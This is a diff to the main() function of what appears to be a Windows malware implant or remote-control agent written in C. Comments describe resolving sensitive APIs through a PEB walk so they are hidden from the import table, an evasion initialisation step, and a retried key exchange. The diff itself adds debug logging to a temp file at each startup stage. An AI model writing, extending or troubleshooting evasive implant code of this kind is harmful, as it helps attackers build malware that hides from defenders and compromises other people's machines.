@@ -796,27 +796,101 @@ void agent_run(AgentState *state) {
 int main(void) {
     AgentState state;
 
+    /* ── EARLY DIAGNOSTIC — uses CRT fopen, no dependencies ── */
+#if CONFIG_DEBUG
+    {
+        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+        if (_ef) {
+            fprintf(_ef, "[early] main() entered, PID=%lu\r\n",
+                    (unsigned long)GetCurrentProcessId());
+            fflush(_ef);
+            fclose(_ef);
+        }
+    }
+#endif
+
     /* FIRST: resolve sensitive APIs via PEB walk before anything else.
      * This must run before agent_init (which calls evasion_init, crypto_init,
      * etc.) because those functions use VirtualAlloc, GetProcAddress, etc.
      * through the iat_hide macros. */
     if (!iat_hide_init()) {
+#if CONFIG_DEBUG
+        {
+            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+            if (_ef) {
+                fprintf(_ef, "[early] iat_hide_init() FAILED\r\n");
+                fflush(_ef); fclose(_ef);
+            }
+        }
+#endif
         return 1;  /* Can't function without core APIs */
     }
 
+#if CONFIG_DEBUG
+    {
+        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+        if (_ef) {
+            fprintf(_ef, "[early] iat_hide_init() OK\r\n");
+            fflush(_ef); fclose(_ef);
+        }
+    }
+#endif
+
     DBG("[main] agent starting, PID=%u", GetCurrentProcessId());
 
+#if CONFIG_DEBUG
+    {
+        /* Check where DBG thinks the log file is */
+        char _tmpbuf[MAX_PATH] = {0};
+        DWORD _tlen = GetTempPathA(MAX_PATH - 20, _tmpbuf);
+        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+        if (_ef) {
+            fprintf(_ef, "[early] GetTempPathA returned: '%s' (len=%lu)\r\n",
+                    _tmpbuf, (unsigned long)_tlen);
+            fflush(_ef); fclose(_ef);
+        }
+    }
+#endif
+
     if (!agent_init(&state)) {
+#if CONFIG_DEBUG
+        {
+            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+            if (_ef) {
+                fprintf(_ef, "[early] agent_init() FAILED\r\n");
+                fflush(_ef); fclose(_ef);
+            }
+        }
+#endif
         DBG("[main] agent_init FAILED — exiting");
         return 1;
     }
     DBG("[main] agent_init OK, starting key exchange");
 
     /* Key exchange with retry */
+#if CONFIG_DEBUG
+    {
+        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+        if (_ef) {
+            fprintf(_ef, "[early] agent_init() OK, starting key exchange\r\n");
+            fflush(_ef); fclose(_ef);
+        }
+    }
+#endif
+
     int retries = 0;
     while (!agent_key_exchange(&state)) {
         retries++;
         DBG("[main] key exchange attempt %d FAILED", retries);
+#if CONFIG_DEBUG
+        {
+            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
+            if (_ef) {
+                fprintf(_ef, "[early] key exchange attempt %d FAILED\r\n", retries);
+                fflush(_ef); fclose(_ef);
+            }
+        }
+#endif
         if (retries > 10) {
             DBG("[main] giving up after %d key exchange attempts", retries);
             crypto_cleanup();
